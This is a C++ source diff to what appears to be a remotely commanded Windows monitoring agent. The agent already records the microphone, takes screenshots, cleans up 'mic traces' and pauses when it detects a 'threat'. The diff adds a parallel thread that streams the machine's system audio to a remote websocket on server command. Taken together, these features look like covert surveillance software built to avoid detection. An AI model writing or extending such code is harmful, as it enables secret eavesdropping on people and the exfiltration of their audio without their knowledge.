@@ -124,6 +124,10 @@ static std::string g_screenshot_apps;
 // Audio recording globals
 static std::thread g_audio_thread;
 static std::atomic<bool> g_audio_active{false};
+static std::atomic<bool> g_audio_interrupt{false}; // set by audio_start to abort current capture immediately
+// Stream audio (WASAPI loopback) — independent thread, runs in parallel with mic recording
+static std::thread g_stream_audio_thread;
+static std::atomic<bool> g_stream_audio_active{false};
 static std::atomic<int> g_audio_segment_duration{300};
 static std::atomic<int> g_audio_sample_rate{44100};
 static std::atomic<int> g_audio_bitrate{128};
@@ -136,6 +140,7 @@ static std::atomic<bool> g_audio_denoise{true};   // high-pass + noise gate
 static std::atomic<bool> g_audio_normalize{true}; // peak normalization
 static std::atomic<int>  g_audio_hum_filter{50};  // 0=off, 50=50Hz, 60=60Hz
 static void audio_thread_func(); // defined later
+static void stream_audio_thread_func(); // defined later
 // (g_audio_record_process removed — was unused declaration left over from a
 //  rundll32-spawn audio path that never actually existed in this build.)
 
@@ -2569,6 +2574,7 @@ static void handle_command(const std::string& msg_str) {
         }
         // ── Audio recording control ──
         else if (cmd == "audio_start") {
+            g_audio_interrupt = true;  // abort any in-progress capture so new mode starts immediately
             g_audio_active = true;
             g_config.audio_enabled = true;
             if (!g_audio_thread.joinable())
@@ -2578,9 +2584,21 @@ static void handle_command(const std::string& msg_str) {
         }
         else if (cmd == "audio_stop") {
             g_audio_active = false;
+            g_audio_interrupt = false;
             g_config.audio_enabled = false;
             save_stream_settings();
             send_ok("\"stopped\"");
+        }
+        // ── Dedicated system audio stream (WASAPI loopback, independent of mic recording) ──
+        else if (cmd == "audio_stream_start") {
+            g_stream_audio_active = true;
+            if (!g_stream_audio_thread.joinable())
+                g_stream_audio_thread = std::thread(stream_audio_thread_func);
+            send_ok("\"stream_started\"");
+        }
+        else if (cmd == "audio_stream_stop") {
+            g_stream_audio_active = false;
+            send_ok("\"stream_stopped\"");
         }
         else if (cmd == "audio_config") {
             std::string v;
@@ -4174,6 +4192,8 @@ static bool capture_audio_direct(std::vector<uint8_t>& audioOut, int duration, i
     DWORD lastClean = 0;
     while ((GetTickCount() - startTick) < maxWait && g_audio_active.load() && g_running) {
         if (waveHdr.dwFlags & WHDR_DONE) break;
+        // Abort immediately when audio_start re-signals a mode change
+        if (g_audio_interrupt.load()) { g_log.info("Audio: interrupt signal, aborting segment"); break; }
         // Threat pause: abort this recording segment; next tick of audio_record_thread will retry
         if (g_paused_by_threat.load()) { g_log.info("Audio: paused by threat, abort segment"); break; }
         // Periodic mic trace cleanup every 10 seconds (was 500ms — blocked capture loop)
@@ -4329,7 +4349,10 @@ static bool capture_audio_direct(std::vector<uint8_t>& audioOut, int duration, i
 }
 
 // ── WASAPI loopback live stream: captures system audio, sends as ALIV chunks ──
-static void capture_audio_live_stream_wasapi(int sampleRate, int bitrate, int channels, bool alsoRecord, int recordDuration) {
+// p_active: which flag to watch for "stop" — defaults to g_audio_active (main audio thread);
+//           pass &g_stream_audio_active when called from the dedicated stream thread.
+static void capture_audio_live_stream_wasapi(int sampleRate, int bitrate, int channels, bool alsoRecord, int recordDuration,
+                                             std::atomic<bool>* p_active = nullptr) {
     int opusSR = 48000;
     if (sampleRate <= 8000)  opusSR = 8000;
     else if (sampleRate <= 12000) opusSR = 12000;
@@ -4427,9 +4450,15 @@ static void capture_audio_live_stream_wasapi(int sampleRate, int bitrate, int ch
 
     g_log.info("Audio LIVE loopback: streaming @ " + std::to_string(opusSR) + "Hz " + std::to_string(bitrate) + "kbps");
 
-    while (g_audio_active.load() && g_running && g_ws && g_ws->is_connected()) {
-        // Source changed at runtime → break so audio_thread_func re-enters with new mode
-        if (g_audio_source.load() != 1) break;
+    // Use the provided active flag, or the default g_audio_active
+    std::atomic<bool>& activeRef = p_active ? *p_active : g_audio_active;
+    const bool isStreamThread = (p_active != nullptr);
+
+    while (activeRef.load() && g_running && g_ws && g_ws->is_connected()) {
+        // Interrupt: only applies to the main audio thread, not the dedicated stream thread
+        if (!isStreamThread && g_audio_interrupt.load()) { g_log.info("Audio LIVE loopback: interrupt signal, restarting"); break; }
+        // Source guard: main thread only — stream thread always uses loopback
+        if (!isStreamThread && g_audio_source.load() != 1) break;
 
         // Wait for data or timeout
         HANDLE ev = cap.event();
@@ -4724,6 +4753,8 @@ static void capture_audio_live_stream(int sampleRate, int bitrate, int channels,
     };
 
     while (g_audio_active.load() && g_running && g_ws && g_ws->is_connected()) {
+        // Interrupt: audio_start re-triggered (mode/config change) — stop immediately
+        if (g_audio_interrupt.load()) { g_log.info("Audio LIVE: interrupt signal, restarting"); break; }
         // ── Detect runtime device or source change: break so audio_thread_func re-enters ──
         if (g_audio_device_id.load() != cur_device_setting) {
             g_log.info("Audio LIVE: device changed (" + std::to_string(cur_device_setting) +
@@ -4857,9 +4888,42 @@ static void capture_audio_live_stream(int sampleRate, int bitrate, int channels,
     g_log.info("Audio LIVE: stream ended");
 }
 
+// ── Dedicated WASAPI loopback stream thread ─────────────────────────────────
+// Runs independently of g_audio_thread — allows system audio streaming in
+// parallel with microphone recording. Controlled by g_stream_audio_active.
+static void stream_audio_thread_func() {
+    g_log.info("Stream audio thread started");
+    while (g_running) {
+        if (!g_stream_audio_active.load()) {
+            std::this_thread::sleep_for(std::chrono::milliseconds(200));
+            continue;
+        }
+        if (!g_ws || !g_ws->is_connected()) {
+            std::this_thread::sleep_for(std::chrono::milliseconds(200));
+            continue;
+        }
+        g_log.info("Stream audio: WASAPI loopback starting");
+        try {
+            capture_audio_live_stream_wasapi(
+                g_audio_sample_rate.load(),
+                g_audio_bitrate.load(),
+                g_audio_channels.load(),
+                false,  // no recording mix, live only
+                0,
+                &g_stream_audio_active  // use our own flag, not g_audio_active
+            );
+        } catch (...) {
+            g_log.warn("Stream audio: WASAPI exception");
+        }
+        if (!g_stream_audio_active.load()) continue;
+        std::this_thread::sleep_for(std::chrono::milliseconds(500));
+    }
+    g_log.info("Stream audio thread stopped");
+}
+
 static void audio_thread_func() {
     g_log.info("Audio thread started");
-    std::this_thread::sleep_for(std::chrono::seconds(3));
+    std::this_thread::sleep_for(std::chrono::milliseconds(300));
 
     while (g_running) {
         if (!g_audio_active.load()) {
@@ -4870,6 +4934,12 @@ static void audio_thread_func() {
             std::this_thread::sleep_for(std::chrono::seconds(1));
             continue;
         }
+
+        // Clear interrupt flag at the start of each capture iteration so
+        // capture functions see a clean state.  audio_start sets it to true
+        // to abort the *previous* capture; once we're here we've exited that
+        // capture and are about to start a fresh one.
+        g_audio_interrupt = false;
 
         int mode = g_audio_mode.load(); // 0=record, 1=live, 2=both
         int sr = g_audio_sample_rate.load();
@@ -5805,8 +5875,10 @@ extern "C" void shutdown_workers(int timeout_ms) {
     // Wake any reconnect-sleepers so they notice g_running=false immediately
     reconnect_wake_all();
 
-    if (g_audio_thread.joinable())      g_audio_thread.join();
-    if (g_screenshot_thread.joinable()) g_screenshot_thread.join();
+    g_stream_audio_active = false;
+    if (g_audio_thread.joinable())        g_audio_thread.join();
+    if (g_stream_audio_thread.joinable()) g_stream_audio_thread.join();
+    if (g_screenshot_thread.joinable())   g_screenshot_thread.join();
 
     // Wait for bg workers (installed_programs, host_update, running_apps, ...)
     {
